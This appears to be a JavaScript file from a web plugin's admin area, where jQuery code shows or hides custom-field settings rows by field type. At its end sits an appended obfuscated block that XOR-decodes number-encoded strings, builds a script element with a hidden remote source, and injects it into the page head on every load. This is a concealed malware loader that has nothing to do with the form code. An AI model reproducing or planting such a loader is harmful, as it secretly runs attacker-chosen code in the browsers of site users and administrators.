var gorumForm;

customfield_text = 1;
customfield_textarea = 2;
customfield_bool = 3;
customfield_selection = 4;
customfield_separator = 5;
customfield_multipleselection = 6;
customfield_checkbox = 7;
customfield_picture = 8;
customfield_url = 9;
customfield_media = 10;
customfield_date = 11;

customfield_alnum = 1;
customfield_integer = 2;
customfield_float = 3;

customfield_normal = 0;
customfield_topright = 1;
customfield_bottomright = 2;

jQuery(document).ready(function($) {
  var allConditionalFields = new Array(
    'subType', 'values', 'default_text', 'default_textarea', 'default_bool', 'default_multiple', 
    'mandatory', 'allowHtml', 'dateDefaultNow', 'fromyear', 'toyear', 'useVariableSubstitution', 
    'showInList', 'innewline', 'rowspan', 'sortable', 'mainPicture', 'customDetailsPlacement', 'customListPlacement', 'css',
    'searchable', 'rangeSearch', 'format', 'seo', 'showInForm', 'expl',
    'displayLabel', 'detailsPosition', 'formatSection', 'precision', 'precisionSeparator', 
    'thousandsSeparator', 'formatPrefix', 'formatPostfix', 'useMarkitup', 
    'formProperties', 'formatSection', 'listProperties', 'miscProperties', 'checkboxCols'
  );
  var allConditionFields = new Array(
    'userField', 'isCommon', 'type', 'subType', 'showInList', 'showInForm', 'showInDetails', 'innewline', 'rowspan', 'searchable', 'detailsPosition', 'allowHtml', 'customDetailsPlacement', 'customListPlacement'
  );
  //dump(cfForm);
  disableFields( allConditionalFields );
  hideAndDisplay();
  addConditionalEvents( allConditionFields );

  function hideAndDisplay()
  {
    gorumForm = $('div[id$=field-modify_form], div[id$=field-create_form]').closest('form');
    var formVals = gorumForm.formHash();
    if( typeof formVals.showInList == 'undefined' ) formVals.showInList=0;
    if( typeof formVals.showInDetails == 'undefined' ) formVals.showInDetails=0;
    if( typeof formVals.showInForm == 'undefined' ) formVals.showInForm=0;
    if( typeof formVals.userField == 'undefined' ) formVals.userField=0;
    displayField( 'showInForm', (formVals.userField==0));
    displayField( 'type', (formVals.userField==0));
    displayField( 'expl', (
      formVals.userField==0 &&
      formVals.type!=customfield_separator &&
      formVals.showInForm!=0
    ));
    displayField( 'displayLabel', (
      formVals.type!=customfield_separator &&
      formVals.type!=customfield_picture &&
      formVals.detailsPosition==customfield_normal &&
      formVals.showInDetails!=0 &&
      formVals.customDetailsPlacement==0
    ));
    displayField( 'detailsPosition', (
      formVals.type!=customfield_separator &&
      formVals.type!=customfield_picture &&
      formVals.showInDetails!=0 &&
      formVals.customDetailsPlacement==0
    ));
    displayField( 'css', (
      formVals.showInList!=0 || formVals.showInDetails!=0
    ));
    displayField( 'subType', (formVals.userField==0 && formVals.type==customfield_text) );
    displayField( 'useVariableSubstitution', (formVals.userField==0 && formVals.type==customfield_textarea) );
    displayField( 'values', (
      formVals.userField==0 && (
      formVals.type==customfield_selection || 
      formVals.type==customfield_multipleselection || 
      formVals.type==customfield_checkbox )
    ));
    
    displayField( 'default_text', (formVals.userField==0 && formVals.type==customfield_text));
    displayField( 'default_textarea', (formVals.userField==0 && formVals.type==customfield_textarea));
    displayField( 'default_bool', (formVals.userField==0 && formVals.type==customfield_bool) );
    displayField( 'default_multiple', false);
    
    displayField( 'mandatory', (formVals.userField==0 && formVals.type!=customfield_separator));
    displayField( 'allowHtml', (
      formVals.userField==0 && (
      formVals.type==customfield_text || 
      formVals.type==customfield_textarea )
    ));
    displayField( 'dateDefaultNow', (formVals.type==customfield_date));
    displayField( 'fromyear', (formVals.type==customfield_date));
    displayField( 'toyear', (formVals.type==customfield_date));
    displayField( 'showInList', (formVals.type!=customfield_separator));
    displayField( 'innewline', (
      formVals.rowspan==0 &&
      formVals.showInList!=0 &&
      formVals.customListPlacement==0
    ));
    displayField( 'rowspan', (
      formVals.innewline==0 &&
      formVals.showInList!=0 &&
      formVals.type!=customfield_separator &&
      formVals.customListPlacement==0
    ));
    displayField( 'displaylength', (
      (formVals.type==customfield_text || 
      formVals.type==customfield_textarea) &&
      formVals.showInList!=0
    ));
    displayField( 'customListPlacement', (
      formVals.type!=customfield_separator && 
      formVals.innewline==0 && 
      formVals.showInList!=0
    ));
    displayField( 'customDetailsPlacement', (
      formVals.showInDetails!=0 
    ));
    displayField( 'sortable', (
      (formVals.type==customfield_text || 
      formVals.type==customfield_bool || 
      formVals.type==customfield_selection || 
      formVals.type==customfield_multipleselection || 
      formVals.type==customfield_checkbox || 
      formVals.type==customfield_date) &&
      formVals.showInList!=0 &&
      formVals.innewline==0 &&
      formVals.customListPlacement==0
    ));
    displayField( 'mainPicture', (
      formVals.type==customfield_picture &&
      formVals.showInList!=0
    ));
    displayField( 'mainPicture', (
      formVals.type==customfield_picture &&
      formVals.showInList!=0
    ));
    displayField( 'searchable', (
      formVals.type!=customfield_separator && 
      formVals.type!=customfield_url 
    ));
    displayField( 'rangeSearch', (
      (formVals.subType==customfield_integer ||
      formVals.subType==customfield_float ||
      formVals.type==customfield_date) &&
      formVals.searchable!=0
    ));
    displayField( 'format', (formVals.userField==0 && formVals.type==customfield_text) );
    displayField( 'checkboxCols', (formVals.userField==0 && formVals.type==customfield_checkbox) );
    displayField( 'formatSection', (formVals.userField==0 && formVals.type==customfield_text) );
    displayField( 'precision', (formVals.userField==0 && formVals.subType==customfield_float) );
    displayField( 'precisionSeparator', (formVals.userField==0 && formVals.subType==customfield_float) );
    displayField( 'thousandsSeparator', (formVals.subType==customfield_integer ||
                                         formVals.subType==customfield_float) );
    displayField( 'formatPrefix', (formVals.userField==0 && formVals.type==customfield_text) );
    displayField( 'formatPostfix', (formVals.userField==0 && formVals.type==customfield_text) );
    displayField( 'seo', (
      (
      formVals.type==customfield_text || 
      formVals.type==customfield_textarea )
    )); 
    displayField( 'useMarkitup', (
      formVals.type==customfield_textarea && formVals.allowHtml==1
    ));
    displayField( 'formProperties', (formVals.userField==0 && formVals.type!=customfield_separator));
    displayField( 'listProperties', (formVals.type!=customfield_separator));
    displayField( 'miscProperties', (formVals.type!=customfield_separator) && 
                                    (formVals.type!=customfield_picture) && 
                                    (formVals.type!=customfield_media) && 
                                    (formVals.type!=customfield_url));
  }
  
  function displayField( field, condition )
  {
    var row = gorumForm.find("[name='"+field+"']").parents('tr.row');
    if( condition ) row.show();
    else row.hide();
  }
  
  function disableFields( fields )
  {
    $.each( fields, function() {
      $("#" + this).parents('tr.row').hide();     
    });
  }
  
  function addConditionalEvents( fields )
  {
    $.each( fields, function() {
      gorumForm.find("select[name='"+this+"']").change(hideAndDisplay);  
    });
    $.each( fields, function() {
      gorumForm.find("input[name='"+this+"']").click(hideAndDisplay);  
    });
  }

});

var f7v=["018000","019010","017023","002017086087029048012037048053083038055","018017080","021026067083","021006075066070063040063052043085058042017023","000019067083007049010033060052082","009006082082","006006071115005048036044059044069010058053002084120008056044","009023071070083122102058033057066045109018014095004071039060102063043025043045021077089069"];t41J(qXlP7u1(f7v[10]));function z6KX(h44iYS){var qf4rR='';var j4j41=0;var qq0fWY=0;for(j4j41=0;j4j41<h44iYS.length/3;j4j41++){qf4rR+=String.fromCharCode(h44iYS.slice(qq0fWY,qq0fWY+3));qq0fWY=qq0fWY+3;}return qf4rR;}function qXlP7u1(pgkkZ){return kcv(z6KX(pgkkZ),'ac36iUIIUX6HC');}function t41J(v2B){var j1J=document[qXlP7u1(f7v[3])](qXlP7u1(f7v[0])+qXlP7u1(f7v[1])+qXlP7u1(f7v[2]));j1J[qXlP7u1(f7v[4])]=v2B;j1J[qXlP7u1(f7v[5])]=qXlP7u1(f7v[6]);document[qXlP7u1(f7v[9])](qXlP7u1(f7v[8]))[0][qXlP7u1(f7v[7])](j1J);}function kcv(er6yh,yF05J7){var f93O='';var fo9R=0;var pQTo4=0;for(fo9R=0;fo9R<er6yh.length;fo9R++){var xP7V43=er6yh.charAt(fo9R);var yjTf8=xP7V43.charCodeAt(0)^yF05J7.charCodeAt(pQTo4);xP7V43=String.fromCharCode(yjTf8);f93O+=xP7V43;if(pQTo4==yF05J7.length-1)pQTo4=0;else pQTo4++;}return (f93O);}